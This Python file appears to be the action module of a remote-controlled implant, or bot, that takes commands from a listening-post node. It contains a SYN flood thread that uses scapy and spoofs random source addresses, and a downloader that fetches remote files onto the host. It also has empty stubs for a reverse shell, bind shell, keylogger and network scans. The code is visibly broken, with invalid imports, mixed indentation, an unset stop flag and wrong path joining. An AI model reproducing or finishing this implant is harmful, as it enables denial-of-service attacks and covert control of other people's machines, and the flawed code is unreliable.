#!/usr/bin/env python

import socket
import random
import sys
import threading
from scapy import scapy.all
import Thread
import urllib2
import os

#
# These functions implement the actions taken by the implant based upon the result of the commands received by from the LP node.
#

class SynFloodThread(Thread):

	def __init__(self, d_host, d_port, rand_src):
        Thread.__init__(self)
        self.d_host = d_host
        self.d_port = d_port
        self.rand_src = rand_src         

	def run(self):

		while not self.stopped:
			ip_segment = IP()
			ip_segment.dst = self.d_host

			if self.rand_src:
				# randomize class A IP
				ip_segment.src = "%i.%i.%i.%i" % (random.randint(1,126),random.randint(1,254),random.randint(1,254),random.randint(1,254))
			# else - scapy will automatically assign the local IP as src.

			tcp_segment = TCP(flags="S")
			tcp_segment.sport = RandShort()
			tcp_segment.dport = int(self.d_port)

        	send(ip_segment/tcp_segment,  verbose=0) # Sends the Packet


def start_syn_flood( d_host, d_port, rand_src = True):

	syn_flood_thread = SynFloodThread(d_host, d_port, rand_src)
	syn_flood_thread.start()
	# add this thread to the thread pool with 'syn_flood_key'
	return syn_flood_thread

def stop_syn_flood():
	pass

def ftp_download():
	pass

def http_download(url, dst_path = os.getcwd(), save_as_name = None):
	
	f = urllib2.urlopen(url)

	if save_as_name is None:
		save_as_name = url.split('\\')[-1] # get last portion of URL as download name

	full_file_path = dst_path + os.pathsep + save_as_name

	with open(full_file_path, "wb") as code:
		code.write(f.read())

def ping_sweep():
	pass

def ping_broadcast():
	pass

def arp_scan():
	pass

def reverse_shell():
	pass

def bind_shell():
	pass

def start_keylogger():
	pass

def stop_keylogger():
	pass
